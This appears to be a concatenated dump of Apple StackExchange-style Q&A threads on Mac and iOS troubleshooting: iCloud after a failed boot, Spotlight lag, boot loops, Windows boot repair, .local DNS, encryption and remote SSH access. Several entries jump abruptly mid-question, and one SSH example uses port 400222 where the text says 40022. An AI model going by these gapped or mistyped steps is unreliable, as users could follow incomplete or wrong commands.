Pro that recently stopped booting. I narrowed this down based on troubleshooting of the boot device to likely the SATA/hard drive connector/cable no longer working for whatever reason.\nI have decided to sell the system. I'd like to know if I remove the hard drive (or in this case, an after-market SSD I've installed) from the system, will there be any other data (i.e. iCloud data) stored on the system on any other chip that I can reset in any way? I plan to reset the SMC/NVRAM before I sell the system off of to someone else.\nAdditionally, if I remove the hard drive, is the system still associated to iCloud (specifically Find My Mac) or any other service? If so, how do I disassociate it? The system will no longer boot even if I put in my boot device.\nThanks!\n\nA: \nI have decided to sell the system. I'd like to know if I remove the\nhard drive (or in this case, an after-market SSD I've installed) from\nthe system, will there be any other data (i.e. iCloud data) stored on\nthe system on any other chip that I can reset in any way?\n\nUnless you actually wipe the SSD clean, you could potentially leave all sorts of personally identifiable information on that drive. As for \"data on a chip,\" there's nothing identifiable that stored.  Apple uses your serial number and the MAC address of your network adapter to validate you to their services.  Once you remove it from your account (see below), the hardware is now disassociated from you.\n\nI plan to reset the SMC/NVRAM before I sell the system off of to\nsomeone else.\n\nThis does nothing.  This is Internet folk lore that this has an actual function related to macOS.  What these two things do is:\n\n*\n\n*Reset the SMC (Systems Management Controller) is resetting what the rest of the industry calls the PMU (Power Management Unit).  If you're having issues with power, battery, charging, etc.  you would reset this chip\n\n\n*Reset the NVRAM, this doesn't store much - just pre-boot environment variables like where to boot from.  It has nothing to do with iCloud.\n\nAdditionally, if I remove the hard drive, is the system still\nassociated to iCloud (specifically Find My Mac) or any other service?\nIf so, how do I disassociate it?\n\nYes.  It's based on the Serial Number of the device.  You can remove it from your account by logging into your AppleID account and removing it.\nAppleID\nThe image below shows how to remove the device from your AppleID account (there's no SN# on that one because it's a VirtualBox VM of macOS Sierra running on my iMac)\n\niCloud & iTunes\nYou need to sign out of these as well.  You go into your local settings and sign out of each service respectively.\nApple has an excellent support document What to do before you sell, give away, or trade in your iPhone, iPad, or iPod touch\n\nThe system will no longer boot even if I put in my boot device.\n\nIt will still boot from USB (if the drive is good).  The best way to ensure that it's still good and it is in fact the cable is to hook it up via a USB to SATA adapter.  If it is, you can wipe the drive and install a fresh copy of macOS on it.\n(You might want to change out the cable - it's pretty inexpensive - see this link in the comments)\n", "Q: Slight delay when bringing up spotlight since booting from an external drive I copied all my data to an external hard drive and used that as my main hard drive for a few days. After that I noticed a slight delay when bringing up spotlight, so that when I search for \"Safari\", it searches for \"fari\" instead, as I am used to being able to start typing close to instantly.\nI just associated that with the fact that booting from an external drive is slower, however, even now when I have copied the data back to my internal drive and boot from that, the delay persists. I have reindexed my drive twice.\nThe problem also exists on the Guest user and my other user, so the problem does not have anything to do with my user/home folder. I am on macOS Mojave 10.14.3.\nEDIT: Even after updating to 10.14.4, the problem still exists.\nEDIT: Also on 10.14.6\n\nA: Note: I can't take credit for these solutions, however a few of them have worked for me in the past.\nSolution #1: Kill SystemUIServer\nLaunch ‘Activity Monitor’ (located in /Applications/Utilities/)\nLocate the process ‘SystemUIServer’, highlight it, and click the red button “Quit Process”\nWithin a few seconds the menubar will rebuild itself and often Spotlight will magically work\nSolution #2: Rebuild the Spotlight Index manually\nLaunch ‘Terminal’ (located in /Applications/Utilities/)\nAt the command prompt, type this exactly:\nsudo mdutil -E /\nYou will be asked for your password, provide it, as this command requires administrator privelages to run\nYou will receive a confirmation message saying that index will be rebuilt\nWait until index is finished rebuilding, this can take a while depending on the size of your hard drive, amount of files, etc.\nNote: You can also rebuild the Spotlight index with MainMenu, mentioned in Solution #4\nSolution #3: Change Desktop Resolution\nThis is a strange fix but it works everytime for me when my Spotlight menu icon highlights but the search form doesn’t appear\nOpen “System Preferences” via the Apple Menu\nClick ‘Displays’ and select a resolution smaller than what you are currently using, 640×480 seems to always work\nSelect your native resolution again, changing your screen resolution back to normal\nThe Spotlight search tray will magically become available again\nSolution #4: Clear caches and preferences\nClear caches and preferences relating to Spotlight, this is best done through either the free tool OnyX, or the free tool MainMenu, I recommend MainMenu because it’s easier for novices\nNote: Some users discover that just cleaning the Font caches is adequate to repair a screwy Spotlight, but it won’t hurt to clear them all\nSolution #5: Reboot your Mac\nThis should almost be listed as #1 just because sometimes a simple reboot will fix Spotlight, but if I can avoid a reboot I will, and often, a reboot isn’t good enough\nWhat do MDS and MDWorker have to do with Spotlight?\nThe MDS process and mdworker processes usually run concurrently on your Mac when Spotlight is indexing your Mac. Let the processes finish running to complete a relevant search index of your Mac filesystem.\n\nA: It's better to check a few things first. There may be a (corrupted) file of folder, which causes Spotlight to index forever.\n\n\n*\n\n*open Activity Monitor\n\n*search for mdworker\n\n*click on mdworker with highest CPU usage\n\n*click on Inspect (2nd icon in upper toolbar)\n\n*click on Open Files and Ports\n\n*if you can locate the corrupted folder, move it to a different location\n\n\n\nExcluding the drive under System Preferences > Spotlight > Privacy will not work, if there was a corrupted file, or indexing hanged at some point.\n\n\nIndexing file may be corrupt\nsudo -i\nrm -R /.Spotlight-V100\nmdutil -i on /\nmdutil -E /\n\n\nIt's worth mentioning that re-indexing, nor re-enabling Spotlight will never delete the index at all. So deleting it manually could fix the problem.\n\n\nIf none of these solved the problem for you, it can be also helpful to see the output of the following.\nmdutil -sav\nmdimport -L\n\n\nA: Here's a simple solution that I believe will remove the dramatic pauses you're experiencing.\nIn System Preferences, go to Spotlight, then select the Privacy tab and add (+) the external drive's name to the list of locations that Spotlight will be -prevented- from scanning. \nThen wait for a minute and do a system restart from the Apple menu. \nWhen it comes back up, I'm betting that all will be well.\nI'm guessing that the root cause for the pauses is Spotlight checking for the existence of the external drive's own index before it begins showing results from your searches.\n", "Q: Huge file when exporting iPhoto slideshow I am creating a slideshow in iPhoto, my slideshow contains about 70 images, each image is about 10MB. When selecting Export to 1080p, it says that it needs more than 20GB of disk space to export. This is insane. My slideshow is using Vintage Prints theme and a 7-minute music file.\nIs there something wrong here? I searched on the internet for the solution but it just mentioned the issue, no solution for this at all. Or maybe this is normal? (which I don't really think so)\nUpdate:\nI took the warning seriously and tried to export the slideshow to an external 1TB hard disk (my Mac disk only had 10GB or less). The export was extremely slow, I let it run overnight and guess what I saw in the final result? The exported video was just only 308MB. Hell, I guess there is a bug in the iPhoto and they are doing crazy buffering while exporting. So, the \"final exported file\" is not as big as its warning, but you still need to have enough space to run the export function. \n\nA: Your best option I think is to reduce the size of your images. This can be done with Preview but is doesn't run in batch mode. There are third party apps like Pixillion that will change your image to a different format or just reduce the quality slightly resulting in a much smaller image. Pixillion has a trail period so you can play with it and see if it works for you. It also appears to have a batch mode option. I saw a 50% reduction by degrading quality by a slight amount. You should play with this to see when you start noticing degradation in the image. See Pixillion panes below.\n\nAfter pressing the \"Compression Settings\" button you get the pane shown below.\n\nAnother option is the App Squash. I don't know how this pwrforms but it sounds like it may do what you want. Developers do not offer a free trail period so its $15 and cross your fingers it helps you.\nThe last option is the one I mentioned earlier. In preview you can go to the  tools menu and click on Adjust size as shown below.\n\nWhen you click on adjust size you get a pane that looks like the image shown below. As you can see you can adjust the image size or the resolution. You can play with these parameters to find the best values.\n\n", "Q: My MacBook is in boot loop My MacBook Air is stuck in boot loop i.e. When I start my mac I see apple logo for some secs and the restarts again.

Hopefully it will bring you to a command prompt.  You can then run these commands to check/repair the file system, and reboot\n/sbin/fsck -fy\nreboot\n\nYou may also want to run hardware diagnostics on your mac.\n\nA: Here is the typical boot up sequence.\nYours seems to be stuck at the \"Secure Boot\" point.\nRecommend to completely wipe the disk and start over.\n\n\nA: Probably the best way is the toughest: Forget the current disk inside the mac. Replace it with a new one. Boot from an external disk containing OSX and install OSX on the new inserted disk. Copy all files from Icloud or your backup back. Not the easiest way, but it should work. And as this needs replacing, i would visit the apple store.\n", "Q: Fix Windows after Ubuntu installation I've followed closely this step-by-step guide: https://apple.stackexchange.com/a/257275/322989\nAfter that my Ubuntu 16.04 LTS and Mac installation work perfectly fine.

So you would have had to adapt the instructions to meet your particular configuration. Step 14 shows the new partitions to be \"swap\", \"ext4\" and \"ESP\" in that order. Your current configuration shows you choose \"swap\", \"ESP\" and \"ext4\" in that order. This change should not have made any difference, but does show one place where you deviated from the original instructions. I assume you made other deviations to the instructions that I can not detect due to lack of information. I also assume this why you can not get Windows to boot. I did a installation using the posted instructions, Ubuntu 16.04.6 and the order of \"swap\", \"ESP\" and \"ext4\". I did not encounter any errors that would prevent Windows from booting.\nI know of two possible answers to your question.\n\n\n*\n\n*You could mount the EFI partition (disk0s1) and post the contents of the following directories (folders).  I could then try to determine if I see something wrong. Be sure to include at least the file names and sizes.\n/Volumes/EFI/EFI/Boot\n/Volumes/EFI/EFI/Microsoft/Boot\n\n\n*Implement the solution given below. Basically, you will be recreating the Windows boot files.\n\n\n*\n\n*You will need a Window 10 installer flash drive. If you do not have this flash drive, then you will need to build one. First download the 64-bit Windows 10 iso from this Microsoft web site. This can be done while running macOS. Currently, I would recommend the Windows 10 April 2018 Update. Next you will need 16 GB or larger flash drive. For your model Mac, I believe the Boot Camp Assistant will aid in the creation of the Windows installer flash drive. If not, let me know.\n\n*Boot to the flash drive. Hold down the option key at start up. From the Startup Manager, select the external drive icon labeled \"EFI Boot\".\n\n*When the window below appears, press the shift+F10 key combination to open a Windows Command Prompt window.\n\nThe Windows Command Prompt window should appear, as shown below.\n\n\n*Use the diskpart command to determine the drive letter for BOOTCAMP partition. In my case, this was drive C:.\ndiskpart\nlist volume\n\n\n*Select the volume with the label EFI. In my case, this was volume 5.\nselect volume 5\n\n\n*Assign this volume the drive letter S:.\nassign letter=s\n\n\n*Enter the command below to exit the diskpart command.\nexit\n\n\n*Here, I will assume the BOOTCAMP partition is assign the drive letter C. Enter the command shown below to recreate the boot files.\nbcdboot C:\\windows /s S:\n\n\n*Enter the command shown below, to close the Windows Command Prompt window.\nexit\n\n\n*Click on the red button with the X to close the window.\n\n\n*Click on the Yes button to cancel the installation.\n\nUpdate 1\nThe output you posted for the commands diskutil list disk0 and list volume seem to contradict each other. One possibility, that would account for this, would be if disk0 is hybrid partitioned. You could check for this condition by entering the following commands after step 4 in my original answer.\nlist disk\nselect disk 0\nlist partition\n\nPost the results to your question. \nUpdate 2\nYou drive appears to be hybrid partitioned. This would explain why Windows fails to boot. While you do not have to use a third party tool to remove hybrid partitioning, the third party tool named gdisk makes removal easy. Below are instructions for removing the hybrid partitioning. \n\n\n*\n\n*Download gdisk. I assume this will goto your Downloads folder.\n\n*Remove the quarantine from the download by entering the command given below in a Terminal application window.\nxattr -d com.apple.quarantine ~/Downloads/gdisk-1.0.4.pkg\n\n\n*Use the Finder application to open gdisk-1.0.4.pkg.

Redownloading these apps was not an issue but when the apps needed updates, it needed me to input my dad's Apple ID password for all the redownloaded apps. How do I transfer these apps to my AppleID? \nIf I can get advise for this or info that there is no real solution, that would be very helpful. \n\nA: Not sure what advice you are looking for really.\nTo update apps downloaded with a particular Apple Id needs the password for that ID.\nPerhaps you should have done a \"factory reset\" and established your own Apple Id from the start. Do not reset until you’re ready to walk away from all the apps you can’t update. You will need to repurchase them, go without or find a substitute app that is available in this case. \n\nA: Apps and other digital content are non-transferable between Apple IDs. This has been a sticking point for many users in the past, since you can't even transfer between the same Apple ID but between different regions. There are two potential solutions:\n\n\n*\n\n*Abandon the apps on your dad's account. Re-buy them on your new Apple ID.\n\n*Use your dad's Apple ID for iTunes stores purchases only, and your own for everything else. You can do this by Settings > iTunes & App Stores and changing your Apple ID there to your dad's Apple ID, but still logging into your own for iCloud. I know that this is how a few of my friends share their apps in their families.\n\n\nA: As @SolarMike has suggested in his answer, you may want to do a Factory Reset of the phone before you invest too much time and effort setting it up. A Factory Reset will avoid potential conflicts between apps or services installed or configured previously. But since you didn't ask, I'll assume you're happy to simply change the Apple ID. You may not have any issues at all; if you do, here's a link explaining how to do a Factory Reset. Note that you can perform the Factory Reset with or without your Dad's Apple ID & password.\nAnd now, the answer to the question you asked: Note that this procedure will vary somewhat depending upon which iPhone you have. The following is for an iPhone 6, but other models will be similar. \nYou may change the Apple ID as follows: \n1. Logout from the current Apple ID:\n\n\n*\n\n*Open/tap Settings app, and select iTunes & App Store  \n\n*Tap the line near the top: Apple ID: email@address.com  \n\n*In the Apple ID pop-up window, tap the option Sign Out\nOnce you've logged out, the Apple ID sign-in screen should be blank/empty.  \n2. Login with your Apple ID (or create a new Apple ID)\n\n\n*\n\n*Tap the Sign In line where the old Apple ID was formerly located  \n\n*Enter your Apple ID and Password in the pop-up window, then tap Sign In\nYou should see the \"spinning wheel\" briefly, and then your Apple ID email will appear in the line near the top. \nYou're done.\n", "Q: Issues with new Macs: Hardware makes them difficult for me to use. What options might be available in the future? At home and at work I have a MacBook Pro (2015) which is the last one before the following hardware changes :\n\n\n*\n\n*Butterfly keyboard.\n\n*Overly large trackpad that causes palm-clicks.\n\n*Touchbar.\n\n\nEach of those alone is a significant issue for me:\n\n\n*\n\n*The existing MacBook is already not a good keyboard for me: I do need the tactile aspect of keys with 'travel'.  My typos on a MBPro keyboard are already much higher than on an external keyboard\n\n*I do work on the move so an external keyboard only is an option a fraction of the time. \n\n*I rest my palms on the laptop so the large trackpad will induce yet more typos\n\n*My fingers look for the specific function keys: the Touchbar does not work\n\n*I do not use smart phones more than just for typing (precariously) because of the lack of physical keyboard . This is after years of trying; it is not working for me. That carries over to the mac and its Touchbar.\n\n\nIf I could buy a non-Apple / non-Mac there would be no issue. But I must use a Mac: all teams that I have worked on for five years only use Macs: and we must use IT supported configurations. Pure linux would work fine (for home) but in the (larger) companies it is not supported (security apps, wifi, productivity apps etc)\nI am also constantly in trouble with memory usage due to running heavy and large application codebases along with VMs, browsers, and productivity apps. The maximum 16GB on the older Macs will eventually simply not be sufficient.\nThe IT folks do not use new Macs and use the old ones. All co-workers that have been around long enough use the old Macs and also refuse to upgrade. So I have not run into anyone with solutions for this yet.\nDoes anyone have a plan for how to handle this?\n\nA: This should probably be a comment, so I'll apologize in advance for posting it as an answer - I lack the required reputation. I'll try to make up for it by elaborating on the topic.\nUsing a desktop Mac through a remote desktop connection\nIt's a relatively difficult solution in practice (see below), but I'd like to suggest buying a newer Mac mini or the like, and connecting to it from any laptop of your choice, if at all possible. The benefits are relatively obvious.\nThere are several drawbacks, however - just to name a few:\n\n\n*\n\n*You will likely need to get permission from your employer to work in this way.\n\n*There are security risks involved in creating a \"door\" to the computer from the outside, especially when connecting from untrusted locations.\n\n*If the computer will be at your employer's buildings as opposed to your home, and no other employee is working in this way, your employer will need to set up their equipment to allow the incoming connections, which will take time and possibly bring in further technical issues.\n\n*Your performance may suffer due to delays in the connection despite the processing power improvement from the new device.\n\n*You will be subject to internet availability wherever you work, if that's not the case already.\n\n\nOther than that, I think your best first course of action is negotiating with the IT department(s) you're involved with.\n\nA: It's really imperative to observe a few things:\nYou want new hardware, and prefer Apple building it for you. That means choosing the right one for you, or influence Apple to cater to your needs, or make a compromise in needs, or look for workarounds and alternatives.\n\n\n*\n\n*Voice your wants and demands. Not necessarily just here (if this community even tolerates something like this and doesn't qualify it as \"just a rant\"). \nBut do two other things:\nwrite it directly to Apple (Feedback), and write to news outlets, magazines, blogs, your own pages. It is absolutely superfluous to cry and whine in private only to go out and pay good money for things you do not really want or need or like. Chances that this succeeds are small, but then at least you have tried and if others chime in in significant enough numbers, then maybe…  \nApple can see the numbers of sales, but not the non-sales. It can count complaints written to them or analysing reviews and net trends. Writing to them and the public increases the likelihood to have that opinion registered and properly weighted. If buyers rip the boxes off the shelves, you are indeed in an insignificant demographic. If sales slow and negative press increases, any intelligent business will have to adapt, somehow.\nIf you buy from an online retailer, write a review that list your likes and dislikes fairly. Only praising a product is common, but absolutely uselesss, unlesss you're interested primarily in stock-market shares. \nWell written and constructive criticism is the most helpful thing to do. It helps others form an opinion and make a decision. And that includes Apple.\nBut you have to be patient and wait, for a thing that may never materialise.\n\n*Do not buy Apple products you are not and will not be satisfied with. New MacBook Pro is expensive and has a hated Touchbar? New MacBook Air will do performance wise or old MacBook Pro 2015? Then do not buy a 2016 MBP, but the one that does suite you, and write about your decision on a forum, blog etc.\n\n*Analyse really carefully your 'musts', mustn'ts' and needs.   \nIn the question it states: \"I must use a Mac\". And then it lists a few 'reasons' to which I would still ask further: \"Why, really?\" The specifics are missing, really. Because you might opt for a Hackintosh or a virtualisation solution for almost everything Mac-only in terms of software.  \nIf it's just about the software to be run, then the two alternatives are worth looking into. If there are other reasons like policy or support within a team or company, then you might ask for exceptions.\n\n*Try to look into workarounds. Hate the keyboard: try an external bluetooth. Hate the glossy screen… in general, try any hack you find.\n\n*Join groups that have a shared goal for this kind of action. \nTo&From Apple: Want a \"greener laptop\": work with Greenpeace to exert pressure. Want a \"right to repair\": support proposals for such legislation. Want a usable keyboard as your last butterfly one failed for the third time: join law suits and write about it.\nTo&From your work groups: join a union or smaller group that fights for your right to choose the hardware you want, as long as it doesn't hamper the workflow or other policies.\n\nA: If you're using the Macbook for work, I don't understand why the keyboard and touch pad are a concern, if you're working on a Mac for 8 hours a day, you should use an external monitor, external mouse and external keyboard for ergonomic purposes. \nThere's no seating position where using the laptop keyboard and laptop screen won't cause permanent damage to your neck. \nThe external Apple keyboards are really good, specially the full length one with a numeric keypad. And if you prefer touch, Apple have a external touchpad as well, although I would highly recommend getting a proper mouse that suits your hands ergonomically (The Apple mouse is very small, so for many people's hands it won't be suited for full day usage)\nAs for the touch bar, it can be turned into a standard set of function keys (F1-F12) if you so desire (I did)\n\nA: Basically you're saying that you do not like any of the computers in the current Mac lineup, and also that you do not like any non-Mac.\nIf you look at that logically, then you have three options:\n\n\n*\n\n*Use only old Mac models, and live with slow performance.\n\n*Hope that Apple introduces a model you like\n\n*Build your own laptop that you actually like\n\n\nAs you state that (1) is \"not sufficient\", it's not an acceptable option for you. Option (3) is usually not viable, unless you happen to have very specific skills or a lot of money to spend.\nThat leaves you with (2) - hope that Apple comes up with new models that you actually like.\nOr you could do something radical and change your own opinions over time.\n\nA: \nThe maximum 16GB on the older Macs will eventually simply not be sufficient... Does anyone have a plan for how to handle this?\n\nIn one word: servers.\nDo you have a solid internet connection at work?  If so, you should consider offloading all that RAM intensive stuff to a server that you connect to via SSH or VNC or NoMachineX or something.  Keep your browser, email client and connection tools on bare metal, and everything else is run via connection to a server.\nKeep your old MacBook and never worry abot hitting RAM limits again.\n\nA: Start a conversation with your IT department about using Linux (possibly alongside Macs, it doesn't have to be a replacement).  Don't just assume they can't/won't support it: go and actually put your case to them.  It sounds like you're not the only person in your company with these concerns.\n(I know, this isn't likely to get a lot of votes on an Apple-centric site.  And I used to like my iMac a lot, but haven't tried the new machines that are bothering you.  But, given your constraints, I think this is the right answer to your question.)\n\n...pure Linux would work fine (for home) but in the (larger) companies\n  it is not supported (security apps, wifi, productivity apps etc)\n\nWhere do you get this idea from?  It simply isn't true: plenty of large companies have been using Linux for many years.\n", "Q: Visualize Syslog on OSX I'm looking for a GUI (or terminal if there is no GUI) application that provides the following:\n\n\n*\n\n*Visualization of syslog logs.\n\n*Filtering: For example, I can filter a particular type of logs, a particular PID, etc..\nBasically, I have an application that logs to syslog. I want to read these logs comfortably. Console.app only does show the syslog file, which is, not quite different than opening the file in a note pad.\nAny ideas?\n\nA: The new console.app will let you set filters and lets you set options to display certain info. Console.app comes with your mac and is in the Utilities folder which is in the Applications folder. Or more clearly its path is /Applications/Utilities\nThe console.app is shown below.\n\n\nA: You have filters such as the following:\n\nHere are the shortcuts to enter:\n\n", "Q: How to use data connection on Apple Watch I just paired up  my Apple Watch with my iPhone 7.  I noticed that only phone calls work while my iPhone is turned off and data/messages do not work at all. Only way to use data on my watch is while my iPhone is turned on.  \nReading the apple web site suggests that both (watch and phone) need to be connected to cellular network in order to use all features of my watch. For example if I leave my phone at home and go to the park with my watch, only way I will be able to send emails and messages from my watch is if my phone that I  left at home is turned on. \nCan somebody explain me how this works and which preconditions need to be fulfilled for me to use data connections on my watch?\n\nA: \nI noticed that only phone calls work while my iPhone is turned off and\n  data/messages do not work at all. \n\nThis is expected behavior.  In order to use messaging features not only must your iPhone be be on, but it must be signed into iMessage (meaning connected to Wifi and/or cellular.  The phone doesn't not need to be with you, however.\n\nOnly way to use data on my watch is while my iPhone is turned on.\n\nNot exactly.  If an App requires data, it can use it even if your phone is not connected - the limitation is only for messaging apps (SMS, MMS, iMesage, etc.)\n\nCan somebody explain me how this works and which preconditions need to\n  be fulfilled for me to use data connections on my watch?\n\nTo use data on your Apple Watch (Series 3 and 4), you just need to be connected to either a cellular network or a WiFi network.  \nApple has an excellent support document How to use your Apple Watch without your iPhone nearby that goes into detail about what's required to use your Apple Watch with cellular.\n", "Q: 2017 MBP screen flashes green or yellow when waking from sleep Ive got a 2017 MBP 15\".

Is this something to be concerned about? The machine is still under warranty, but i dont want to take it to the Apple store unnecessarily.\nIve noticed this only happens after waking the machine from a deep sleep, if i close the lid and re-open it after about 20 mins it does not happen.\nIm running OSX 10.13.6\n\nA: What version of macOS are you using? High Sierra + Metal did cause some issues. There is a Reddit thread about it: https://www.reddit.com/r/MacOS/comments/73nc9h/after_high_sierra_weird_colors_when_waking_up/\nIt is a software problem. Double check to see if the OS is updated.\nDefinitely visit the store if this persists.\n", "Q: Use a single shortcut to activate an app (might running in other spaces) in the current space Background: I have two spaces, one is for work and one is for entertaining. They are for different purposes, and it is a common situation where the same app is running in both spaces (for example, a web browser app can have 2 different windows, one is related to work and one to Internet browsing, and they are distributed in different spaces).\nWhat I want to achieve: I like the ability to activate an app quickly by using a single shortcut (by using Keyboard maestro, or Karabiner, or BetterTouchTool, or whatever app you would recommend to me). This single shortcut can achieve several things in different situations:\n\n\n*\n\n*When the app is not running in any of the space, then the obvious thing is to launch it in the current space\n\n*When the app is running and have window(s) open in the other space –\n2.1. But there is no window open in the current space – then open a new window of this app\n2.2. And there is already existing window(s) open in the current space – then resume the existing window(s)\nDo you know how can I achieve this effect? I have tried many ways with the aforementioned OS assistant apps, but because they can only tell whether the specific app is running and is at the front (even if it is only running and at the front in the other space), but cannot tell if there is a window open or not in the current space, so I cannot achieve 2.1 and 2.2 both at the same time using a single shortcut.\nIf I activate the app (similar to clicking on the dock icon but with a shortcut) with window(s) running in the other space, then only 2.2 can be achieved not 2.1. In fact, nothing would happen in the case of 2.1, no popping out any window or switching to the other space or anything, because the system assume that the app is running and it already has its focus on it, while in fact the running window is on the other space so the current space cannot see a thing. You always have to follow with a next move, for example, command + N to create a new window, or just switch to the other space to check whether there is a window open, and it's overall a very jarring experience.\nOr, I can always open a new window of the app in the current space using shortcut, but in that case only 2.1 can be achieved not 2.2. It's very useful to resume the existing window(s) where you have already been working on in the current space.\nHopefully I have made my conundrum clear enough. It would be much easier for me to navigate the whole OS if I can find a way to work this out, so thank you for any input!\n\nA: I only have a partial answer that solves following question: How to assign a single shortcut to activate an app?\nThis solution will:\n\n\n*\n\n*start the app when it is not running\n\n*when it is running, bring it to the foreground, meaning that the focus will be set to this app.\n\n\nThis can be achieved without a third party application.\n\n\n*\n\n*Open Automator and select Quick Action (might be called Service in version of macOS earlier than Mojave)\n\n*In the new workflow, search for the action Launch application by searching for it in the name searchbox.\n\n*Double tap Launch application, which will be added to workflow pane. \n\n*Select your application from the dropdown list. By default only applications in /Applications will be selected, so choose other... if needed.\n\n*Save the workflow. Name it something sensible like Open MyApp.\n\n*Open System Preferences > Keyboard. Click the Shortcuts tab and select Services from the left hand pane.\n\n*Under General in the right hand pane, you will find your freshly created workflow. Assign a keyboard shortcut there. \nHope this helps.\nTested on Catalina 10.15.4.\n", "Q: what is the Update from iMac OS X 10.6.8 When I go into my Apple Software Updates on my OS X 10.6.8 computer to update to OS X 10.9, the computer tells me that I do not have any new updates.\nHow can I upgrade to OS X 10.9 if it does not give me that option? \nOperating system of my iMac\n  Model Name:   iMac\n  Model Identifier: iMac10,1\n  Processor Name:   Intel Core 2 Duo\n  Processor Speed:  3.06 GHz\n  Number Of Processors: 1\n  Total Number Of Cores:    2\n  L2 Cache: 3 MB\n  Memory:   4 GB\n  Bus Speed:    1.07 GHz  \n\nA: Your Mac is a 2009 iMac.

I hadn't used it in over a year because we moved and I couldn't pick up any stations, but I bought a new outdoor antenna and now have stuff to watch. I have a bookmark to the server that uses my computer's name (roberts-mac-mini.local) and when I tried to access it from my iPhone 6s, it eventually timed out.  This also happens on my iPad Mini.\nThe thing is, if I use the DHCP address, it works.  Also, if I enter roberts-mac-mini.local into Safari on my laptop, it works! It's only when trying to access .local domains from iOS devices that it doesn't work.\nAdditionally, I cannot ssh via the Terminus app nor can I ping any of my 3 macs using a network utility app using their .local addresses.\nOddly, occasionally, it DOES work, though I have not been able to figure out why.\nI just called and spoke to Apple Support.  They screen shared with me on my iPhone and I demonstrated how I could access the computer using the DHCP address but not with the .local address.  I showed them ping for 2 .local addresses as well.  They had me eventually \"Reset all settings\" on the iPhone and the .local domains all started working for all 3 computers I'm running!  It's a pretty drastic fix though.  It's going to take me all day going back through my settings and getting everything back to normal.  And I'd rather not do this on my iPad.  Does anyone know a more nuanced fix to this issue or why it's happening in the first place?  I don't want to go back and fix all my settings only to find out that I've re-introduced the issue.\n\nA: I found an additional workaround after trying the above solutions without luck:\n\n*\n\n*On iOS, go to the Wi-Fi settings of the home/office network you are connected to.\n\n*Go to Configure DNS and set it to manual.\n\n*Then add the following search domain: .local\n\nAfter that it immediately started working for me. I just found this solution so can't tell yet if it would stay stable over time but so far it works fine.\nPerhaps entering the search domain somehow triggers iOS to actually do the proper DNS lookup request for .local domains. (In my case the local router would come back with the correct internal IP for the domain as I entered it into the LAN DNS settings of the router.)\n\nA: I figured out a temporary work-around:\n\n\n*\n\n*Turn airplane mode on and off\n\n\nThis flushes the DNS cache on the iPhone, which caches DNS resolutions set by Apple's Bonjour, which uses .local for things like airplay and printer service broadcasting.\nOnce you do this with airplane mode, access to .local addresses on your network should start working, but it's only a temporary fix.  Once Bonjour tramples over the DNS settings, it will stop working again.  You can repeat this trick to restore access, but for a more permanent fix, you'll just have to use your DHCP-assigned IP address.\nIf you need .local DNS resolution to work reliably, Apple needs to fix this issue, so I suggest you submit feedback to them.\nI blogged about the issue here.\n\nA: The issue is that .local is not a normal domain name and you should not be using it in a normal DNS\nSee Wikipedia for a discussion - note that Microsoft have changed their recommendations over time\nRFC6762    says\n\nAny DNS query for a name ending with \".local.\" MUST be sent to the\nmDNS IPv4 link-local multicast address 224.0.0.251 (or its IPv6\nequivalent FF02::FB).\n\nBut for small networks you don't actually need a DNS, just use the machine's name and add .local to the end. If all devices have mDNS resolvers installed (which all Apple devices do and the first blog entry explains how to install for Windows and some Linux) then 'it just works'.\nIf you need DNS for other reasons then don't use .local as a domain but I have seen .internal suggested but there is no defined standard.\nMicrosoft and similar extracts from the Wikipedia article suggests\n\nGenerally, we recommend that you register DNS names for internal and external namespaces with an Internet registrar. This includes the DNS names of Active Directory domains, unless such names are subdomains of DNS names that are registered by your organization name. For example, corp.example.com is a subdomain of example.com. Registering your DNS name with an Internet registrar may help prevent a name collision. A name collision may occur if another organization tries to register the same DNS name, or if your organization merges with another organization that uses the same DNS name.\n\nSeveral blogs give more readable explanations including https://stevessmarthomeguide.com/multicast-dns/\n\nBlockquote\n\n", "Q: FileVault alternative Re. this question on Super user, I can't use iPad + Luna as primary monitor and FileVault simultaneously. My question is then, is there another way to conveniently encrypt the Document folder on the Mac? In other words, a way to replace FileVault as seamlessly as possible, targeting only the normal user documents?\n\nA: Depending on your definition of \"conveniently.\" You could make an encrypted .DMG and store your sensitive docs in the disk image.\nOnce mounted macOS sees the mounted image as just another volume, the only part requiring a password is when mounting the image.\nIf you created it as a .sparseimage it should expand as you need it to without having to create a large image that would take into account future usage.\n\nA: VeraCrypt is an open-source, code-audited encryption tool for most platforms, including MacOS. It allows the creation of encrypted \"containers\", which may be what you need for just encrypting the Document folder.\nWith reference to your requirements of \"conveniently and seamlessly as possible\", bear in mind that other methods are likely to incur speed penalties in Disk operations. (FileVault2 itself has some disk speed reduction, and FV2 and Mac hardware are designed to help each other perform the task).\n", "Q: Unable to Install Apps Despite Plenty of Free Space According to Settings, I (should) have around 32 GB of free space and yet I get \"Your device does not have enough available storage to install this app\" error.\nI have no clue as why this is happening in the first place.\nThanks!\n\n\n\n\n*\n\n*iPhone 8 Plus (MQ8L2TU/A)\n\n*iOS 12.1.4 (16D57)\n\n\nA: That is odd, to say the least. I am guessing here that somehow storage is fragmented and there is not enough contiguous free space.\nI would do a \"backup, wipe and restore.\"\nIn other words, plug your phone into your computer and back it up locally (set a backup password so the backup retains your saved passwords). Once that is done go into settings > general > reset > erase all content and settings, and wipe the phone.

You will need to configure your firewall to allow/forward ports as necessary, but on the flip side, it gives you far more options (like hosting your own web servers)\nDynamic DNS\nThere are many DDNS providers; some paid, some free.  I personally recommend FreeDNS as they are free (as in beer) and compatible with a number of routers and virtually all operating systems.\nBasically, you'll register on their site by selecting a TLD and then adding your host info.  For example:  myhost.example.com  They''l assign you to example.com but you can choose the name of your host (myhost).  From there, anywhere on the web you can reach your home by going to myhost.example.com.\nFirewall/Port Forwarding\nYou can forward all traffic from port 22 (SSH) from the router directly to your server.  In fact, your can use a non-standard port (i.e. 40022) on the firewall for added security.  When you SSH, you just specify the port and the firewall will forward it appropriately.\nssh user@myhost.example.com -p 400222\n\nThe same hold true for SCP and SFTP as well.  You'll need to consult your router's setup guide for specifics on port forwarding.\nThere are a number of clients available that work on routers or on the system.  If your router supports it, use that client.  If not, install the client on your server and have it update periodically.\n\nA: Why not just utilize iCloud Drive?

